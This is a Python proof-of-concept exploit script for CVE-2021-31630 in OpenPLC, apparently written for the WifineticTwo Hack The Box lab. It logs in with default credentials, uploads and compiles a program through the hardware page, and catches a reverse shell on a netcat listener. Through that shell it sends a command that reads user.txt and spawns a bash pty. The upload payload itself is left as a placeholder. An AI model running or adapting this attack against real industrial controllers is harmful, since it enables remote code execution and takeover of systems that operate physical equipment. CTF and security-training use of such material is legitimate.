#!/usr/bin/env python3
import subprocess
import requests
import argparse
import signal
import time
import sys

# Start Netcat listener
nc_process = subprocess.Popen(["nc", "-lvp", "4566"])

# Define command line arguments
parser = argparse.ArgumentParser(description="PoC exploit script for CVE-2021-31630 affecting OpenPLC on the WifineticTwo box at Hack The Box")
parser.add_argument("-ip", type=str, default="10.*.*.*", help="IP address to listen on", required=True)
args = parser.parse_args()

# Initialize variables
local_ip = args.ip
local_port = 4566
username = "openplc"
password = "openplc"
baseURL = 'http://10.10.11.7:8080'
loginURL = 'http://10.10.11.7:8080/login'
loginCREDS = {'username': username,'password': password}
hardware_url = 'http://10.10.11.7:8080/hardware'
boundary = '---------------------------3040215761330541470566170096'

# Handle Ctrl+C gracefully
def signal_handler(sig, frame):
    print('\n[!] You pressed Ctrl+C!')
    nc_process.kill()
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

# Define headers for the HTTP requests
headers2 = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'multipart/form-data; boundary=---------------------------3040215761330541470566170096',
    'Origin': 'http://10.10.11.7:8080',
    'Connection': 'close',
    'Referer': 'http://10.10.11.7:8080/hardware',
}

# Define the data to be uploaded
uploadRQ = f'''\
-----------------------------3040215761330541470566170096

# Rest of your uploadRQ code here...

-----------------------------3040215761330541470566170096--
'''

# Attempt to log in and exploit the vulnerability
with requests.Session() as session:
    LOGINresponse = session.post(loginURL, data=loginCREDS)

    if LOGINresponse.ok and len(LOGINresponse.content) >= 34100:
        print("[+] Logged in successfully.")
        responseUPLAOD = session.post(hardware_url, headers=headers2, data=uploadRQ.encode('utf-8'))
        anotherget = session.get(baseURL+"/compile-program?file=blank_program.st")
        compiling = True

        while compiling:
            checkURL = 'http://10.10.11.7:8080/compilation-logs'
            check = session.get(checkURL)
            startPLC = '/start_plc'

            if check.status_code == 200 and len(check.content) < 250:
                print("[+] Compiling is running, checking again in 5 seconds...")
                time.sleep(5)
            elif check.status_code == 200 and len(check.content) >= 250:
                print("[+] Exploit uploaded successfully.")
                print("[+] Gaining reverse shell.")
                time.sleep(2)
                print("[+] Check your listener.")

                # Wait for Netcat connection
                print("[+] Waiting for Netcat connection...")
                nc_process.wait()

                # Send command to reverse shell
                print("[+] Sending command to reverse shell...")
                time.sleep(2)
                nc_command = "find / -name user.txt -exec cat {} \; 2>/dev/null || python3 -c \"import pty;pty.spawn('/bin/bash')\" \n"
                nc_process.stdin.write(nc_command.encode())
                nc_process.stdin.flush()

                start = session.get(baseURL+startPLC)
                compiling = False
            else:
                print(f"[-] Unexpected status or response length. Response body:\n{check.text}")
                compiling = False

    else:
        print("[-] Login failed, check username and password!")

nc_process.kill()
